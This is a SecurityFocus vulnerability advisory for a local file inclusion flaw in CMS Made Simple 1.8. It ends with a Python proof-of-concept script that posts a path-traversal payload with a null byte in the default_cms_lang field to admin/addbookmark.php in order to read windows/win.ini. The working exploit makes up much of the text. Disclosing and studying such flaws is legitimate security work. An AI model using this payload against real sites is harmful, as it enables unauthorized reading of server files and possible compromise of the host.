source: http://www.securityfocus.com/bid/41565/info

CMS Made Simple is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially sensitive information and execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the underlying computer; other attacks are also possible.

# ------------------------------------------------------------------------ 
# Software................CMS Made Simple 1.8 
# Vulnerability...........Local File Inclusion 
# Download................http://www.cmsmadesimple.org/ 
# Release Date............7/11/2010 
# Tested On...............Windows Vista + XAMPP 
# ------------------------------------------------------------------------ 
# Author..................John Leitch 
# Site....................http://cross-site-scripting.blogspot.com/ 
# Email...................john.leitch5@gmail.com 
# ------------------------------------------------------------------------ 
#  
# --Description--
# 
# A local file inclusion vulnerability in CMS Made Simple 1.8 can be
# exploited to include arbitrary files.
# 
# 
# --PoC--
import httplib, urllib

host = 'localhost'
path = '/cmsms'

lfi = '../' * 32 + 'windows/win.ini\x00'

c = httplib.HTTPConnection(host)
c.request('POST', path + '/admin/addbookmark.php',
          urllib.urlencode({ 'default_cms_lang': lfi }),
          { 'Content-type': 'application/x-www-form-urlencoded' })
r = c.getresponse()

print r.status, r.reason
print r.read()